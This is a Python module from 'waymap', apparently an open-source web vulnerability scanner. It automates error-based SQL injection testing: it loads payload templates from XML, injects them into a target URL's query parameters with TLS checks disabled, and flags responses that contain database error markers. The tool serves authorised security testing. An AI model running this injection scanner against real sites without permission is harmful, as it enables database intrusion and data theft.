# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# error.py 

import requests
import xml.etree.ElementTree as ET
import random
import re
import os
import json
from urllib.parse import urlparse, parse_qs
import time
from urllib.parse import urlparse, parse_qs
from colorama import Fore, Style, init
import urllib3
from lib.parse.random_headers import generate_random_headers
from lib.injection.sqlin.sql import abort_all_tests

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
successful_requests = 0
failed_requests = 0

headers = generate_random_headers()


def parse_error_based_tests_from_xml(file_path="data/error_based.xml"):
    """Parse error-based SQLi test cases from XML."""
    tree = ET.parse(file_path)
    root = tree.getroot()
    tests = []

    for test in root.findall('test'):
        title = test.find('title').text
        payload_template = test.find('./request/payload').text
        dbms = test.find('./details/dbms').text if test.find('./details/dbms') is not None else 'Unknown'
        dbms_version = test.find('./details/dbms_version').text if test.find('./details/dbms_version') is not None else ''

        tests.append({
            'title': title,
            'payload_template': payload_template,
            'dbms': dbms,
            'dbms_version': dbms_version
        })
    return tests


def replace_placeholders(template, delimiters, rand_numbers):
    """Replace placeholders in the template with generated values and remove any single quotes."""
    replaced_template = (template
                         .replace("[DELIMITER_START]", delimiters[0])
                         .replace("[DELIMITER_STOP]", delimiters[1])
                         .replace("[RANDNUM]", str(rand_numbers[0])))

    for i, rand_num in enumerate(rand_numbers[:5], start=1):
        replaced_template = replaced_template.replace(f"[RANDNUM{i}]", str(rand_num))

    replaced_template = replaced_template.replace("'", "")
    return replaced_template


def inject_payload(url, payload):
    """Inject the payload into URL query parameters and return injected parameter."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        test_url = f"{url}&{param}={query_params[param][0]} {payload}"
        yield test_url, param


def detect_server_info(url):
    """Detect server and web technology from headers."""
    response = requests.head(url, headers=headers, verify=False)
    server = response.headers.get('Server', 'Unknown')
    technology = response.headers.get('X-Powered-By', 'Unknown')
    return server, technology


def load_output_file(target):
    """Loads or initializes the output JSON file."""
    parsed_url = urlparse(target)
    domain = parsed_url.netloc
    output_file = f"sessions/{domain}/waymap_full_results.json"

    if not os.path.exists(output_file):
        os.makedirs(f"sessions/{domain}", exist_ok=True)
        with open(output_file, 'w') as file:
            json.dump({"scans": []}, file, indent=4)

    with open(output_file, 'r') as file:
        return json.load(file), output_file


def save_to_output_file(target, vuln_data):
    """Saves vulnerability data to the output file while avoiding duplicates."""
    data, output_file = load_output_file(target)

    if "SQL Injection" not in data["scans"]:
        data["scans"].append({"SQL Injection": {"Technique: Error-Based": []}})

    sql_injection_block = next((entry["SQL Injection"] for entry in data["scans"] if "SQL Injection" in entry), None)
    error_based_block = sql_injection_block.get("Technique: Error-Based", [])

    for entry in error_based_block:
        if entry["Vulnerable URL"] == vuln_data["Vulnerable URL"] and entry["Payload"] == vuln_data["Payload"]:
            return  

    error_based_block.append(vuln_data)
    sql_injection_block["Technique: Error-Based"] = error_based_block

    with open(output_file, 'w') as file:
        json.dump(data, file, indent=4)

    print(f"\n{Style.BRIGHT}[{Fore.YELLOW}Vulnerability saved to JSON{Style.RESET_ALL}] {output_file}")


def error_based_sqli(url, test):
    """Perform error-based SQL injection testing."""
    global successful_requests, failed_requests

    delimiters = ('0x716a6b7671', '0x7171766b71')
    rand_numbers = [random.randint(1000, 9999) for _ in range(5)]
    payload = replace_placeholders(test['payload_template'], delimiters, rand_numbers)

    current_time = time.strftime('%H:%M:%S', time.localtime())
    print(f"{Style.BRIGHT}[{Fore.BLUE}{current_time}{Style.RESET_ALL}] [{Fore.GREEN}Testing{Style.RESET_ALL}]: {Fore.CYAN}{test['title']}{Style.RESET_ALL}")

    custom_patterns = [
        "Duplicate entry 'qjkvq1qqvkq1' for key 'group_key'",
        "qjkvq1qqvkq1"
    ]

    for test_url, injected_param in inject_payload(url, payload):
        try:
            if make_request(test_url, custom_patterns):
                server, technology = detect_server_info(url)

                print(f"{Style.BRIGHT}{Fore.GREEN}[+] Vulnerability found!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Target URL: {Fore.WHITE}{url}")
                print(f"{Fore.CYAN}Injected Parameter: {Fore.WHITE}{injected_param}")
                print(f"{Fore.CYAN}Payload Title: {Fore.WHITE}{test['title']}")
                print(f"{Fore.CYAN}Payload Used: {Fore.WHITE}{payload}")
                print(f"{Fore.CYAN}DBMS Detected: {Fore.WHITE}{test['dbms'] if test['dbms'] else 'Unknown'}")
                print(f"{Fore.CYAN}Web Technology: {Fore.WHITE}{technology}")
                print(f"{Fore.CYAN}Server Name: {Fore.WHITE}{server}")
                print(f"{Fore.CYAN}Severity: {Fore.WHITE}10")
                print(f"{Fore.CYAN}Total Successful Requests: {Fore.WHITE}{successful_requests}")
                print(f"{Fore.CYAN}Total Failed Requests: {Fore.WHITE}{failed_requests}")

                vuln_data = {
                    "Vulnerable URL": url,
                    "Injected Parameter": injected_param,
                    "Payload": payload,
                    "Payload Title": test['title'],
                    "DBMS Detected": test['dbms'],
                    "Web Technology": technology,
                    "Server Name": server,
                    "Severity": 10
                }
                save_to_output_file(url, vuln_data)
                return True
        except Exception as e:
            print(f"{Style.BRIGHT}{Fore.RED}[!] Error with URL {test_url}: {e}{Style.RESET_ALL}")
            failed_requests += 1
    return False


def make_request(test_url, custom_patterns):
    """Make a request and check for custom patterns in response."""
    global successful_requests, failed_requests
    try:
        response = requests.get(test_url, headers=headers, verify=False)
        successful_requests += 1

        for pattern in custom_patterns:
            if re.search(pattern, response.text):
                return True
    except requests.RequestException as e:
        print(f"{Style.BRIGHT}{Fore.RED}[!] Request error: {e}{Style.RESET_ALL}")
        failed_requests += 1
    return False


def process_urls(urls):
    global abort_all_tests
    for url in urls:
        if abort_all_tests:
            break

        try:
            if any(error_based_sqli(url, test) for test in parse_error_based_tests_from_xml()):
                break
        except KeyboardInterrupt:
            print(f"\n{Style.BRIGHT}{Fore.YELLOW}Process interrupted by user.{Style.RESET_ALL}")
            while True:
                user_input = input(f"{Style.BRIGHT}{Fore.CYAN}Enter 'n' for next URL or 'e' to exit all tests: {Style.RESET_ALL}")
                if user_input.lower() == 'n':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Continuing with next URL...{Style.RESET_ALL}")
                    break
                elif user_input.lower() == 'e':
                    abort_all_tests = True  
                    print(f"{Style.BRIGHT}{Fore.RED}Exiting all SQL Injection tests...{Style.RESET_ALL}")
                    return
                elif user_input == '':
                    print(f"{Style.BRIGHT}{Fore.GREEN}Resuming scan...{Style.RESET_ALL}")
                    break  
                else:
                    print(f"{Style.BRIGHT}{Fore.YELLOW}Invalid input, please try again.{Style.RESET_ALL}")